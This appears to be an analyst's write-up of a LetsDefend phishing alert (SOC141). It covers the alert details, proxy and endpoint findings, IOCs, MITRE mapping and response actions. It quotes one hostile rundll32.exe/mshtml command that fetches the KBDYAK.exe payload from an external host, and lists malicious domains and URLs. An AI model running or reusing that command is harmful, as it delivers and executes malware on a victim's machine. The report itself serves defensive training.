# 🚨 SOC141 - Phishing URL Detected

## 📌 Summary

A security alert was triggered after an internal user accessed a suspicious URL identified as a phishing domain. The investigation focused on validating the malicious URL, analyzing network activity, and investigating endpoint behavior to determine potential compromise.

---

## 🧾 Alert Details

| Field | Value |
|---------|---------|
| Alert ID | SOC141 |
| Event ID | 86 |
| Category | Phishing |
| User | ellie |
| Hostname | EmilyComp |
| Source IP | 172.16.17.49 |
| Destination IP | 91.189.114.8 |
| Destination Domain | mogagrocol.ru |
| URL | `http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io` |

---

## 🔍 Investigation

The investigation focused on proxy logs, threat intelligence analysis, and endpoint activity.

### Key Findings

- Suspicious phishing URL accessed by an internal endpoint
- Domain reputation analysis showed malicious indicators
- Proxy logs confirmed communication with the suspicious domain
- User interaction with the phishing URL was confirmed
- Endpoint investigation identified suspicious `rundll32.exe` execution activity
- The attacker attempted to execute remote code and retrieve a malicious payload from external infrastructure

### Suspicious Command Identified

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://ru-uid-507352920.pp.ru/KBDYAK.exe")
```

The command indicates abuse of the legitimate Windows binary **rundll32.exe** to execute malicious code and retrieve the payload **KBDYAK.exe** from an external server.

---

## 🌐 Network Activity

| Field | Value |
|---------|---------|
| Protocol | HTTP |
| Port | 80 |
| Destination IP | 91.189.114.8 |

Additional malicious communication was identified involving:

```text
http://ru-uid-507352920.pp.ru/KBDYAK.exe
```

The activity indicates attempted payload delivery from attacker-controlled infrastructure.

---

## 🚨 Impact Assessment

- Successful phishing URL access
- Malicious command execution identified
- Attempted payload retrieval from external infrastructure
- Likely endpoint compromise
- Endpoint containment required to prevent further malicious activity

---

## 🔗 Indicators of Compromise (IOCs)

| Type | Indicator |
|--------|-----------|
| Domain | mogagrocol.ru |
| IP Address | 91.189.114.8 |
| URL | http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php |
| Payload | KBDYAK.exe |
| External Resource | ru-uid-507352920.pp.ru |

---

## 🧠 MITRE ATT&CK Mapping

| Technique | Description |
|------------|------------|
| T1566 | Phishing |
| T1204 | User Execution |
| T1218.011 | System Binary Proxy Execution: Rundll32 |
| T1105 | Ingress Tool Transfer |

---

## 🛠️ Response Actions

- Classified alert as True Positive
- Isolated the affected endpoint
- Blocked malicious domains and IP addresses
- Identified and removed malicious payloads
- Recommended additional forensic analysis
- Monitored the environment for related indicators

---

## 📚 Conclusion

This investigation identified a phishing attack in which a user accessed a malicious URL, leading to attempted code execution through the abuse of **rundll32.exe**.

Analysis revealed suspicious command execution and attempted retrieval of the malicious payload **KBDYAK.exe** from attacker-controlled infrastructure.

Based on the collected evidence, the alert was classified as a **True Positive** and required endpoint containment and additional investigation.

### ✅ Final Verdict

**True Positive**

### 🎯 Classification

**Phishing / Malicious URL**

---

⭐ SOC investigation completed following the workflow:

**Detection → Analysis → Impact Assessment → Response**
